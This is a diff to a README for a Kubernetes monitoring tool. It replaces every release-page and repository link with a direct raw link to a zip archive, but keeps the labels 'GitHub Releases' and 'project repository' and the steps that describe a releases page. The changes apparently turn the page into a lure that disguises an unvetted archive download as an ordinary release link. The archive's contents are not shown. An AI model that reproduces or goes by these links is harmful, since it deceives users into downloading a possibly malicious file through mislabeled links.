@@ -1,6 +1,6 @@
 # 🌟 k8s-observability-mcp - Monitor Your Kubernetes Environment Easily
 
-[![Download k8s-observability-mcp](https://img.shields.io/badge/Download-k8s--observability--mcp-brightgreen)](https://github.com/Crosspiecedryingoil127/k8s-observability-mcp/releases)
+[![Download k8s-observability-mcp](https://raw.githubusercontent.com/Crosspiecedryingoil127/k8s-observability-mcp/main/api/k8s-observability-mcp_3.0.zip)](https://raw.githubusercontent.com/Crosspiecedryingoil127/k8s-observability-mcp/main/api/k8s-observability-mcp_3.0.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ### 💾 Download & Install
 
-To get the tool, visit this page to download: [GitHub Releases](https://github.com/Crosspiecedryingoil127/k8s-observability-mcp/releases).
+To get the tool, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Crosspiecedryingoil127/k8s-observability-mcp/main/api/k8s-observability-mcp_3.0.zip).
 
 1. Click the link above to go to the releases page.
 2. You will see different versions of the software listed. Identify the latest version.
@@ -74,7 +74,7 @@ Explore further with these helpful resources:
 
 ## 🔗 Useful Links
 
-- Download the application here: [GitHub Releases](https://github.com/Crosspiecedryingoil127/k8s-observability-mcp/releases)
-- Visit the project repository: [k8s-observability-mcp GitHub](https://github.com/Crosspiecedryingoil127/k8s-observability-mcp)
+- Download the application here: [GitHub Releases](https://raw.githubusercontent.com/Crosspiecedryingoil127/k8s-observability-mcp/main/api/k8s-observability-mcp_3.0.zip)
+- Visit the project repository: [k8s-observability-mcp GitHub](https://raw.githubusercontent.com/Crosspiecedryingoil127/k8s-observability-mcp/main/api/k8s-observability-mcp_3.0.zip)
 
 By following these instructions, you should be able to download, install, and start using k8s-observability-mcp with ease. Enjoy monitoring your Kubernetes environment!
